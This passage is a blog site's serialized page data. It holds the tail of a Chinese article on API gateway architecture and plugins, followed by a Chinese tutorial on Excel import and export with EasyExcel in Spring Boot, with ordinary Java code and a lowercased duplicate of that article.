各服务分片\n\napi网关处于接入层角色，具有承上启下的作用，承担着报文转换、参数处理、协议适配、权限管理、监控告警等一系列重要角色信息。\n\n内部网关架构不宜分享，但以开源的 soul 网关为例：\n\n\n\n涵盖有：admin管理中心、zk配置中心和gateway三部分组成。\n\n * admin管理中心：统一管理接入api网关的接口\n\n * zk配置中心：经admin管理中心配置好数据后，由zk负责完成网关的同步信息，保证网关的高可用，承担着网关数据源的角色\n\n * gateway：由netty实现，基于异步的、事件驱动的、高性能、高并发解决方案\n\n\n# gateway核心设计\n\napi网关基本请求流程：\n\n 1. 确定api映射关系和参数协议报文等要素，通过admin管理中心接入api网关\n 2. 在admin管理中心对接口进行场景绑定、应用绑定、授权上线同步zk配置中心，接入网关\n 3. api网关下发sdk和公私钥、app_id等文件，客户方引入sdk加密加签调用相应接口\n 4. 给客户方开通权限，客户方联调，上送请求报文，请求报文流转于gateway中\n\n\n\ngateway基于netty pipeline handler的处理模式，以 过滤链 + 插件化 的方式将请求流转于gateway，进一步对请求进行解密验签、参数转换、限流熔断、权限过滤等不同功能处理。\n\n同时可针对不同场景、不同功能做出不同的定制化插件开发。\n\n\n# api网关基本功能\n\napi管理：基于admin管理中心进行接口的配置、上线、关系绑定等。\n\n参数处理：基于admin管理中心对参数进行映射处理（如将真实入参requestid暴露为req_id）；对参数进行动态绑定、对参数进行合理化输出等。\n\n动态配置：基于admin管理中心对接口进行系统化操作后，基于zk配置中心实现热部署式接口上线、更新、发布等操作。\n\n定制化插件：gateway支持通过插件的形式对网关请求做出不同功能。\n\n\n# 插件列表\n\n请求头转换插件：可对请求头和响应头进行配置化定制\n\n鉴权配置插件：支持jwt和oauth2鉴权和自定义jar鉴权\n\n限流配置插件：使用分布式令牌桶的形式对每个服务进行差别化限流\n\n熔断降级配置插件：使用resilience4j来进行熔断降级，如果后端服务有异常处理，可以进行降级\n\n请求报文校验插件：采用json schema对报文体或部分报文体的格式校验\n\ngroovy脚本插件：可动态在调用链中插入一段java脚本，来执行需要的逻辑\n\nmock插件：mock请求结果，配置该插件后，请求不会再转发给后端服务，根据配置好的freemarker模板直接响应给调用方\n\nrpc路由转换插件：配置将http请求转化为dubbo请求时需要的参数，如服务名，参数转化逻辑\n\nurl重写插件：该插件可对tesla请求到后端的url进行差异化配置，支持直接转发和占位符转发\n\n创建token插件：可根据响应报文内容抽取参数后生成jwt\n\n执行上传jar包插件：如果有特殊化的功能，当前插件体系无法满足时，可以使用该插件自己编写逻辑\n\n查询聚合插件：该插件可实现调用方一次查询，聚合多个后端接口数据的效果\n\n消除鉴权插件：该插件用于当api的鉴权类型不是开放时，但个别endpoint不希望鉴权时使用，如/login，/logout等\n\n缓存结果插件：该插件可根据配置缓存请求结果\n\n请求报文转换插件：该插件根据配置的freemarker脚本对请求体和响应体的报文进行转换\n\n支持自定义插件。\n\n\n# 参考\n\nhttps://gitee.com/mirrors/soul\n\nhttps://github.com/jiangjunwei/tesla\n\nhttps://www.jianshu.com/p/7baab672b822",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"EasyExcel",frontmatter:{title:"EasyExcel",date:"2022-01-10T00:00:00.000Z",tags:["poi","分布式"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/EasyExcel.html",relativePath:"views/backend/EasyExcel.md",key:"v-32906b18",path:"/views/backend/EasyExcel.html",headers:[{level:2,title:"EasyExcel简介",slug:"easyexcel简介",normalizedTitle:"easyexcel简介",charIndex:132},{level:2,title:"集成",slug:"集成",normalizedTitle:"集成",charIndex:147},{level:2,title:"使用",slug:"使用",normalizedTitle:"使用",charIndex:153},{level:3,title:"简单导出",slug:"简单导出",normalizedTitle:"简单导出",charIndex:161},{level:3,title:"简单导入",slug:"简单导入",normalizedTitle:"简单导入",charIndex:171},{level:3,title:"复杂导出",slug:"复杂导出",normalizedTitle:"复杂导出",charIndex:181},{level:4,title:"使用EasyPoi实现",slug:"使用easypoi实现",normalizedTitle:"使用easypoi实现",charIndex:5881},{level:4,title:"寻找方案",slug:"寻找方案",normalizedTitle:"寻找方案",charIndex:5987},{level:4,title:"解决思路",slug:"解决思路",normalizedTitle:"解决思路",charIndex:6200},{level:4,title:"实现过程",slug:"实现过程",normalizedTitle:"实现过程",charIndex:6330},{level:3,title:"其他使用",slug:"其他使用",normalizedTitle:"其他使用",charIndex:191},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:199},{level:2,title:"参考资料",slug:"参考资料",normalizedTitle:"参考资料",charIndex:205},{level:2,title:"项目源码地址",slug:"项目源码地址",normalizedTitle:"项目源码地址",charIndex:213}],excerpt:'<Boxx/>\n<p>操作Excel实现导入导出是个非常常见的需求，之前介绍了一款非常好用的工具<a href="https://mp.weixin.qq.com/s?__biz=MzU1Nzg4NjgyMw==&amp;mid=2247494886&amp;idx=1&amp;sn=7b9a4ff5aacc7d5f109ea8ee2babd06a&amp;scene=21#wechat_redirect" target="_blank" rel="noopener noreferrer">EasyPoi<OutboundLink/></a> 。有读者提出在数据量大的情况下，EasyPoi占用内存大，性能不够好。今天给大家推荐一款性能更好的Excel导入导出工具<code>EasyExcel</code>，希望对大家有所帮助！</p>\n',headersStr:"EasyExcel简介 集成 使用 简单导出 简单导入 复杂导出 使用EasyPoi实现 寻找方案 解决思路 实现过程 其他使用 总结 参考资料 项目源码地址",content:'操作Excel实现导入导出是个非常常见的需求，之前介绍了一款非常好用的工具EasyPoi 。有读者提出在数据量大的情况下，EasyPoi占用内存大，性能不够好。今天给大家推荐一款性能更好的Excel导入导出工具EasyExcel，希望对大家有所帮助！\n\n\n\n * EasyExcel简介\n * 集成\n * 使用\n   * 简单导出\n   * 简单导入\n   * 复杂导出\n   * 其他使用\n * 总结\n * 参考资料\n * 项目源码地址\n\n\n\n\n# EasyExcel简介\n\n官方文档：传送门\n\nEasyExcel是一款阿里开源的Excel导入导出工具，具有处理快速、占用内存小、使用方便的特点，在Github上已有22k+Star，可见其非常流行。\n\nEasyExcel读取75M(46W行25列)的Excel，仅需使用64M内存，耗时20s，极速模式还可以更快！\n\n\n\n\n# 集成\n\n> 在SpringBoot中集成EasyExcel非常简单，仅需一个依赖即可。\n\n\x3c!--EasyExcel相关依赖--\x3e\n<dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>easyexcel</artifactId>\n    <version>3.0.5</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 使用\n\n> EasyExcel和EasyPoi的使用非常类似，都是通过注解来控制导入导出。接下来我们以会员信息和订单信息的导入导出为例，分别实现下简单的单表导出和具有一对多关系的复杂导出。\n\n\n# 简单导出\n\n> 我们以会员信息的导出为例，来体验下EasyExcel的导出功能。\n\n * 首先创建一个会员对象Member，封装会员信息，这里使用了EasyExcel的注解；\n\n/**\n * 购物会员\n * Created by macro on 2021/10/12.\n */\n@Data\n@EqualsAndHashCode(callSuper = false)\npublic class Member {\n    @ExcelProperty("ID")\n    @ColumnWidth(10)\n    private Long id;\n    @ExcelProperty("用户名")\n    @ColumnWidth(20)\n    private String username;\n    @ExcelIgnore\n    private String password;\n    @ExcelProperty("昵称")\n    @ColumnWidth(20)\n    private String nickname;\n    @ExcelProperty("出生日期")\n    @ColumnWidth(20)\n    @DateTimeFormat("yyyy-MM-dd")\n    private Date birthday;\n    @ExcelProperty("手机号")\n    @ColumnWidth(20)\n    private String phone;\n    @ExcelIgnore\n    private String icon;\n    @ExcelProperty(value = "性别", converter = GenderConverter.class)\n    @ColumnWidth(10)\n    private Integer gender;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n * 上面代码使用到了EasyExcel的核心注解，我们分别来了解下：\n\n * * @ExcelProperty：核心注解，value属性可用来设置表头名称，converter属性可以用来设置类型转换器；\n   * @ColumnWidth：用于设置表格列的宽度；\n   * @DateTimeFormat：用于设置日期转换格式。\n\n * 在EasyExcel中，如果你想实现枚举类型到字符串的转换（比如gender属性中，0->男，1->女），需要自定义转换器，下面为自定义的GenderConverter代码实现；\n\n/**\n * excel性别转换器\n * Created by macro on 2021/12/29.\n */\npublic class GenderConverter implements Converter<Integer> {\n    @Override\n    public Class<?> supportJavaTypeKey() {\n        //对象属性类型\n        return Integer.class;\n    }\n\n    @Override\n    public CellDataTypeEnum supportExcelTypeKey() {\n        //CellData属性类型\n        return CellDataTypeEnum.STRING;\n    }\n\n    @Override\n    public Integer convertToJavaData(ReadConverterContext<?> context) throws Exception {\n        //CellData转对象属性\n        String cellStr = context.getReadCellData().getStringValue();\n        if (StrUtil.isEmpty(cellStr)) return null;\n        if ("男".equals(cellStr)) {\n            return 0;\n        } else if ("女".equals(cellStr)) {\n            return 1;\n        } else {\n            return null;\n        }\n    }\n\n    @Override\n    public WriteCellData<?> convertToExcelData(WriteConverterContext<Integer> context) throws Exception {\n        //对象属性转CellData\n        Integer cellValue = context.getValue();\n        if (cellValue == null) {\n            return new WriteCellData<>("");\n        }\n        if (cellValue == 0) {\n            return new WriteCellData<>("男");\n        } else if (cellValue == 1) {\n            return new WriteCellData<>("女");\n        } else {\n            return new WriteCellData<>("");\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n * 接下来我们在Controller中添加一个接口，用于导出会员列表到Excel，还需给响应头设置下载excel的属性，具体代码如下；\n\n/**\n * EasyExcel导入导出测试Controller\n * Created by macro on 2021/10/12.\n */\n@Controller\n@Api(tags = "EasyExcelController", description = "EasyExcel导入导出测试")\n@RequestMapping("/easyExcel")\npublic class EasyExcelController {\n\n    @SneakyThrows(IOException.class)\n    @ApiOperation(value = "导出会员列表Excel")\n    @RequestMapping(value = "/exportMemberList", method = RequestMethod.GET)\n    public void exportMemberList(HttpServletResponse response) {\n        setExcelRespProp(response, "会员列表");\n        List<Member> memberList = LocalJsonUtil.getListFromJson("json/members.json", Member.class);\n        EasyExcel.write(response.getOutputStream())\n                .head(Member.class)\n                .excelType(ExcelTypeEnum.XLSX)\n                .sheet("会员列表")\n                .doWrite(memberList);\n    }\n    \n  /**\n   * 设置excel下载响应头属性\n   */\n  private void setExcelRespProp(HttpServletResponse response, String rawFileName) throws UnsupportedEncodingException {\n    response.setContentType("application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");\n    response.setCharacterEncoding("utf-8");\n    String fileName = URLEncoder.encode(rawFileName, "UTF-8").replaceAll("\\\\+", "%20");\n    response.setHeader("Content-disposition", "attachment;filename*=utf-8\'\'" + fileName + ".xlsx");\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n * 运行项目，通过Swagger测试接口，注意在Swagger中访问接口无法直接下载，需要点击返回结果中的下载按钮才行，访问地址：http://localhost:8088/swagger-ui/\n\n\n\n * 下载完成后，查看下文件，一个标准的Excel文件已经被导出了。\n\n\n\n\n# 简单导入\n\n> 接下来我们以会员信息的导入为例，来体验下EasyExcel的导入功能。\n\n * 在Controller中添加会员信息导入的接口，这里需要注意的是使用@RequestPart注解修饰文件上传参数，否则在Swagger中就没法显示上传按钮了；\n\n/**\n * EasyExcel导入导出测试Controller\n * Created by macro on 2021/10/12.\n */\n@Controller\n@Api(tags = "EasyExcelController", description = "EasyExcel导入导出测试")\n@RequestMapping("/easyExcel")\npublic class EasyExcelController {\n    \n    @SneakyThrows\n    @ApiOperation("从Excel导入会员列表")\n    @RequestMapping(value = "/importMemberList", method = RequestMethod.POST)\n    @ResponseBody\n    public CommonResult importMemberList(@RequestPart("file") MultipartFile file) {\n        List<Member> memberList = EasyExcel.read(file.getInputStream())\n                .head(Member.class)\n                .sheet()\n                .doReadSync();\n        return CommonResult.success(memberList);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n * 然后在Swagger中测试接口，选择之前导出的Excel文件即可，导入成功后会返回解析到的数据。\n\n\n\n\n# 复杂导出\n\n> 当然EasyExcel也可以实现更加复杂的导出，比如导出一个嵌套了商品信息的订单列表，下面我们来实现下！\n\n# 使用EasyPoi实现\n\n之前我们使用过EasyPoi实现该功能，由于EasyPoi本来就支持嵌套对象的导出，直接使用内置的@ExcelCollection注解即可实现，非常方便也符合面向对象的思想。\n\n\n\n# 寻找方案\n\n> 由于EasyExcel本身并不支持这种一对多的信息导出，所以我们得自行实现下，这里分享一个我平时常用的快速查找解决方案的办法。\n\n我们可以直接从开源项目的issues里面去搜索，比如搜索下一对多，会直接找到有无一对多导出比较优雅的方案这个issue。\n\n\n\n从此issue的回复我们可以发现，项目维护者建议创建自定义合并策略来实现，有位回复的老哥已经给出了实现代码，接下来我们就用这个方案来实现下。\n\n\n\n# 解决思路\n\n为什么自定义单元格合并策略能实现一对多的列表信息的导出呢？首先我们来看下将嵌套数据平铺，不进行合并导出的Excel。\n\n\n\n看完之后我们很容易理解解决思路，只要把订单ID相同的列中需要合并的列给合并了，就可以实现这种一对多嵌套信息的导出了。\n\n# 实现过程\n\n * 首先我们得把原来嵌套的订单商品信息给平铺了，创建一个专门的导出对象OrderData，包含订单和商品信息，二级表头可以通过设置@ExcelProperty的value为数组来实现；\n\n/**\n * 订单导出\n * Created by macro on 2021/12/30.\n */\n@Data\n@EqualsAndHashCode(callSuper = false)\npublic class OrderData {\n    @ExcelProperty(value = "订单ID")\n    @ColumnWidth(10)\n    @CustomMerge(needMerge = true, isPk = true)\n    private String id;\n    @ExcelProperty(value = "订单编码")\n    @ColumnWidth(20)\n    @CustomMerge(needMerge = true)\n    private String orderSn;\n    @ExcelProperty(value = "创建时间")\n    @ColumnWidth(20)\n    @DateTimeFormat("yyyy-MM-dd")\n    @CustomMerge(needMerge = true)\n    private Date createTime;\n    @ExcelProperty(value = "收货地址")\n    @CustomMerge(needMerge = true)\n    @ColumnWidth(20)\n    private String receiverAddress;\n    @ExcelProperty(value = {"商品信息", "商品编码"})\n    @ColumnWidth(20)\n    private String productSn;\n    @ExcelProperty(value = {"商品信息", "商品名称"})\n    @ColumnWidth(20)\n    private String name;\n    @ExcelProperty(value = {"商品信息", "商品标题"})\n    @ColumnWidth(30)\n    private String subTitle;\n    @ExcelProperty(value = {"商品信息", "品牌名称"})\n    @ColumnWidth(20)\n    private String brandName;\n    @ExcelProperty(value = {"商品信息", "商品价格"})\n    @ColumnWidth(20)\n    private BigDecimal price;\n    @ExcelProperty(value = {"商品信息", "商品数量"})\n    @ColumnWidth(20)\n    private Integer count;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n * 然后将原来嵌套的Order对象列表转换为OrderData对象列表；\n\n/**\n * EasyExcel导入导出测试Controller\n * Created by macro on 2021/10/12.\n */\n@Controller\n@Api(tags = "EasyExcelController", description = "EasyExcel导入导出测试")\n@RequestMapping("/easyExcel")\npublic class EasyExcelController {\n    private List<OrderData> convert(List<Order> orderList) {\n        List<OrderData> result = new ArrayList<>();\n        for (Order order : orderList) {\n            List<Product> productList = order.getProductList();\n            for (Product product : productList) {\n                OrderData orderData = new OrderData();\n                BeanUtil.copyProperties(product,orderData);\n                BeanUtil.copyProperties(order,orderData);\n                result.add(orderData);\n            }\n        }\n        return result;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n * 再创建一个自定义注解CustomMerge，用于标记哪些属性需要合并，哪个是主键；\n\n/**\n * 自定义注解，用于判断是否需要合并以及合并的主键\n */\n@Target({ElementType.FIELD})\n@Retention(RetentionPolicy.RUNTIME)\n@Inherited\npublic @interface CustomMerge {\n\n    /**\n     * 是否需要合并单元格\n     */\n    boolean needMerge() default false;\n\n    /**\n     * 是否是主键,即该字段相同的行合并\n     */\n    boolean isPk() default false;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n * 再创建自定义单元格合并策略类CustomMergeStrategy，当Excel中两列主键相同时，合并被标记需要合并的列；\n\n/**\n * 自定义单元格合并策略\n */\npublic class CustomMergeStrategy implements RowWriteHandler {\n    /**\n     * 主键下标\n     */\n    private Integer pkIndex;\n\n    /**\n     * 需要合并的列的下标集合\n     */\n    private List<Integer> needMergeColumnIndex = new ArrayList<>();\n\n    /**\n     * DTO数据类型\n     */\n    private Class<?> elementType;\n\n    public CustomMergeStrategy(Class<?> elementType) {\n        this.elementType = elementType;\n    }\n\n    @Override\n    public void afterRowDispose(WriteSheetHolder writeSheetHolder, WriteTableHolder writeTableHolder, Row row, Integer relativeRowIndex, Boolean isHead) {\n        // 如果是标题,则直接返回\n        if (isHead) {\n            return;\n        }\n\n        // 获取当前sheet\n        Sheet sheet = writeSheetHolder.getSheet();\n\n        // 获取标题行\n        Row titleRow = sheet.getRow(0);\n\n        if (null == pkIndex) {\n            this.lazyInit(writeSheetHolder);\n        }\n\n        // 判断是否需要和上一行进行合并\n        // 不能和标题合并，只能数据行之间合并\n        if (row.getRowNum() <= 1) {\n            return;\n        }\n        // 获取上一行数据\n        Row lastRow = sheet.getRow(row.getRowNum() - 1);\n        // 将本行和上一行是同一类型的数据(通过主键字段进行判断)，则需要合并\n        if (lastRow.getCell(pkIndex).getStringCellValue().equalsIgnoreCase(row.getCell(pkIndex).getStringCellValue())) {\n            for (Integer needMerIndex : needMergeColumnIndex) {\n                CellRangeAddress cellRangeAddress = new CellRangeAddress(row.getRowNum() - 1, row.getRowNum(),\n                        needMerIndex, needMerIndex);\n                sheet.addMergedRegionUnsafe(cellRangeAddress);\n            }\n        }\n    }\n\n    /**\n     * 初始化主键下标和需要合并字段的下标\n     */\n    private void lazyInit(WriteSheetHolder writeSheetHolder) {\n\n        // 获取当前sheet\n        Sheet sheet = writeSheetHolder.getSheet();\n\n        // 获取标题行\n        Row titleRow = sheet.getRow(0);\n        // 获取DTO的类型\n        Class<?> eleType = this.elementType;\n\n        // 获取DTO所有的属性\n        Field[] fields = eleType.getDeclaredFields();\n\n        // 遍历所有的字段，因为是基于DTO的字段来构建excel，所以字段数 >= excel的列数\n        for (Field theField : fields) {\n            // 获取@ExcelProperty注解，用于获取该字段对应在excel中的列的下标\n            ExcelProperty easyExcelAnno = theField.getAnnotation(ExcelProperty.class);\n            // 为空,则表示该字段不需要导入到excel,直接处理下一个字段\n            if (null == easyExcelAnno) {\n                continue;\n            }\n            // 获取自定义的注解，用于合并单元格\n            CustomMerge customMerge = theField.getAnnotation(CustomMerge.class);\n\n            // 没有@CustomMerge注解的默认不合并\n            if (null == customMerge) {\n                continue;\n            }\n\n            for (int index = 0; index < fields.length; index++) {\n                Cell theCell = titleRow.getCell(index);\n                // 当配置为不需要导出时，返回的为null，这里作一下判断，防止NPE\n                if (null == theCell) {\n                    continue;\n                }\n                // 将字段和excel的表头匹配上\n                if (easyExcelAnno.value()[0].equalsIgnoreCase(theCell.getStringCellValue())) {\n                    if (customMerge.isPk()) {\n                        pkIndex = index;\n                    }\n\n                    if (customMerge.needMerge()) {\n                        needMergeColumnIndex.add(index);\n                    }\n                }\n            }\n        }\n\n        // 没有指定主键，则异常\n        if (null == this.pkIndex) {\n            throw new IllegalStateException("使用@CustomMerge注解必须指定主键");\n        }\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n\n * 接下来在Controller中添加导出订单列表的接口，将我们自定义的合并策略CustomMergeStrategy给注册上去；\n\n/**\n * EasyExcel导入导出测试Controller\n * Created by macro on 2021/10/12.\n */\n@Controller\n@Api(tags = "EasyExcelController", description = "EasyExcel导入导出测试")\n@RequestMapping("/easyExcel")\npublic class EasyExcelController {\n    \n    @SneakyThrows\n    @ApiOperation(value = "导出订单列表Excel")\n    @RequestMapping(value = "/exportOrderList", method = RequestMethod.GET)\n    public void exportOrderList(HttpServletResponse response) {\n        List<Order> orderList = getOrderList();\n        List<OrderData> orderDataList = convert(orderList);\n        setExcelRespProp(response, "订单列表");\n        EasyExcel.write(response.getOutputStream())\n                .head(OrderData.class)\n                .registerWriteHandler(new CustomMergeStrategy(OrderData.class))\n                .excelType(ExcelTypeEnum.XLSX)\n                .sheet("订单列表")\n                .doWrite(orderDataList);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n * 在Swagger中访问接口测试，导出订单列表对应Excel；\n\n\n\n * 下载完成后，查看下文件，由于EasyExcel需要自己来实现，对比之前使用EasyPoi来实现麻烦了不少。\n\n\n\n\n# 其他使用\n\n由于EasyExcel的官方文档介绍的比较简单，如果你想要更深入地进行使用的话，建议大家看下官方Demo。\n\n\n\n\n# 总结\n\n体验了一把EasyExcel，使用还是挺方便的，性能也很优秀。但是比较常见的一对多导出实现比较复杂，而且功能也不如EasyPoi 强大。如果你的Excel导出数据量不大的话，可以使用EasyPoi，如果数据量大，比较在意性能的话，还是使用EasyExcel吧。\n\n来源于 https://mp.weixin.qq.com/s/1c9ojd9GaUO70IhJu3jO8A\n\n\n# 参考资料\n\n * 项目地址：https://github.com/alibaba/easyexcel\n * 官方文档：https://www.yuque.com/easyexcel/doc/easyexcel\n\n\n# 项目源码地址\n\nhttps://github.com/macrozheng/mall-learning/tree/master/mall-tiny-easyexcel',normalizedContent:'操作excel实现导入导出是个非常常见的需求，之前介绍了一款非常好用的工具easypoi 。有读者提出在数据量大的情况下，easypoi占用内存大，性能不够好。今天给大家推荐一款性能更好的excel导入导出工具easyexcel，希望对大家有所帮助！\n\n\n\n * easyexcel简介\n * 集成\n * 使用\n   * 简单导出\n   * 简单导入\n   * 复杂导出\n   * 其他使用\n * 总结\n * 参考资料\n * 项目源码地址\n\n\n\n\n# easyexcel简介\n\n官方文档：传送门\n\neasyexcel是一款阿里开源的excel导入导出工具，具有处理快速、占用内存小、使用方便的特点，在github上已有22k+star，可见其非常流行。\n\neasyexcel读取75m(46w行25列)的excel，仅需使用64m内存，耗时20s，极速模式还可以更快！\n\n\n\n\n# 集成\n\n> 在springboot中集成easyexcel非常简单，仅需一个依赖即可。\n\n\x3c!--easyexcel相关依赖--\x3e\n<dependency>\n    <groupid>com.alibaba</groupid>\n    <artifactid>easyexcel</artifactid>\n    <version>3.0.5</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 使用\n\n> easyexcel和easypoi的使用非常类似，都是通过注解来控制导入导出。接下来我们以会员信息和订单信息的导入导出为例，分别实现下简单的单表导出和具有一对多关系的复杂导出。\n\n\n# 简单导出\n\n> 我们以会员信息的导出为例，来体验下easyexcel的导出功能。\n\n * 首先创建一个会员对象member，封装会员信息，这里使用了easyexcel的注解；\n\n/**\n * 购物会员\n * created by macro on 2021/10/12.\n */\n@data\n@equalsandhashcode(callsuper = false)\npublic class member {\n    @excelproperty("id")\n    @columnwidth(10)\n    private long id;\n    @excelproperty("用户名")\n    @columnwidth(20)\n    private string username;\n    @excelignore\n    private string password;\n    @excelproperty("昵称")\n    @columnwidth(20)\n    private string nickname;\n    @excelproperty("出生日期")\n    @columnwidth(20)\n    @datetimeformat("yyyy-mm-dd")\n    private date birthday;\n    @excelproperty("手机号")\n    @columnwidth(20)\n    private string phone;\n    @excelignore\n    private string icon;\n    @excelproperty(value = "性别", converter = genderconverter.class)\n    @columnwidth(10)\n    private integer gender;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n * 上面代码使用到了easyexcel的核心注解，我们分别来了解下：\n\n * * @excelproperty：核心注解，value属性可用来设置表头名称，converter属性可以用来设置类型转换器；\n   * @columnwidth：用于设置表格列的宽度；\n   * @datetimeformat：用于设置日期转换格式。\n\n * 在easyexcel中，如果你想实现枚举类型到字符串的转换（比如gender属性中，0->男，1->女），需要自定义转换器，下面为自定义的genderconverter代码实现；\n\n/**\n * excel性别转换器\n * created by macro on 2021/12/29.\n */\npublic class genderconverter implements converter<integer> {\n    @override\n    public class<?> supportjavatypekey() {\n        //对象属性类型\n        return integer.class;\n    }\n\n    @override\n    public celldatatypeenum supportexceltypekey() {\n        //celldata属性类型\n        return celldatatypeenum.string;\n    }\n\n    @override\n    public integer converttojavadata(readconvertercontext<?> context) throws exception {\n        //celldata转对象属性\n        string cellstr = context.getreadcelldata().getstringvalue();\n        if (strutil.isempty(cellstr)) return null;\n        if ("男".equals(cellstr)) {\n            return 0;\n        } else if ("女".equals(cellstr)) {\n            return 1;\n        } else {\n            return null;\n        }\n    }\n\n    @override\n    public writecelldata<?> converttoexceldata(writeconvertercontext<integer> context) throws exception {\n        //对象属性转celldata\n        integer cellvalue = context.getvalue();\n        if (cellvalue == null) {\n            return new writecelldata<>("");\n        }\n        if (cellvalue == 0) {\n            return new writecelldata<>("男");\n        } else if (cellvalue == 1) {\n            return new writecelldata<>("女");\n        } else {\n            return new writecelldata<>("");\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n * 接下来我们在controller中添加一个接口，用于导出会员列表到excel，还需给响应头设置下载excel的属性，具体代码如下；\n\n/**\n * easyexcel导入导出测试controller\n * created by macro on 2021/10/12.\n */\n@controller\n@api(tags = "easyexcelcontroller", description = "easyexcel导入导出测试")\n@requestmapping("/easyexcel")\npublic class easyexcelcontroller {\n\n    @sneakythrows(ioexception.class)\n    @apioperation(value = "导出会员列表excel")\n    @requestmapping(value = "/exportmemberlist", method = requestmethod.get)\n    public void exportmemberlist(httpservletresponse response) {\n        setexcelrespprop(response, "会员列表");\n        list<member> memberlist = localjsonutil.getlistfromjson("json/members.json", member.class);\n        easyexcel.write(response.getoutputstream())\n                .head(member.class)\n                .exceltype(exceltypeenum.xlsx)\n                .sheet("会员列表")\n                .dowrite(memberlist);\n    }\n    \n  /**\n   * 设置excel下载响应头属性\n   */\n  private void setexcelrespprop(httpservletresponse response, string rawfilename) throws unsupportedencodingexception {\n    response.setcontenttype("application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");\n    response.setcharacterencoding("utf-8");\n    string filename = urlencoder.encode(rawfilename, "utf-8").replaceall("\\\\+", "%20");\n    response.setheader("content-disposition", "attachment;filename*=utf-8\'\'" + filename + ".xlsx");\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n * 运行项目，通过swagger测试接口，注意在swagger中访问接口无法直接下载，需要点击返回结果中的下载按钮才行，访问地址：http://localhost:8088/swagger-ui/\n\n\n\n * 下载完成后，查看下文件，一个标准的excel文件已经被导出了。\n\n\n\n\n# 简单导入\n\n> 接下来我们以会员信息的导入为例，来体验下easyexcel的导入功能。\n\n * 在controller中添加会员信息导入的接口，这里需要注意的是使用@requestpart注解修饰文件上传参数，否则在swagger中就没法显示上传按钮了；\n\n/**\n * easyexcel导入导出测试controller\n * created by macro on 2021/10/12.\n */\n@controller\n@api(tags = "easyexcelcontroller", description = "easyexcel导入导出测试")\n@requestmapping("/easyexcel")\npublic class easyexcelcontroller {\n    \n    @sneakythrows\n    @apioperation("从excel导入会员列表")\n    @requestmapping(value = "/importmemberlist", method = requestmethod.post)\n    @responsebody\n    public commonresult importmemberlist(@requestpart("file") multipartfile file) {\n        list<member> memberlist = easyexcel.read(file.getinputstream())\n                .head(member.class)\n                .sheet()\n                .doreadsync();\n        return commonresult.success(memberlist);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n * 然后在swagger中测试接口，选择之前导出的excel文件即可，导入成功后会返回解析到的数据。\n\n\n\n\n# 复杂导出\n\n> 当然easyexcel也可以实现更加复杂的导出，比如导出一个嵌套了商品信息的订单列表，下面我们来实现下！\n\n# 使用easypoi实现\n\n之前我们使用过easypoi实现该功能，由于easypoi本来就支持嵌套对象的导出，直接使用内置的@excelcollection注解即可实现，非常方便也符合面向对象的思想。\n\n\n\n# 寻找方案\n\n> 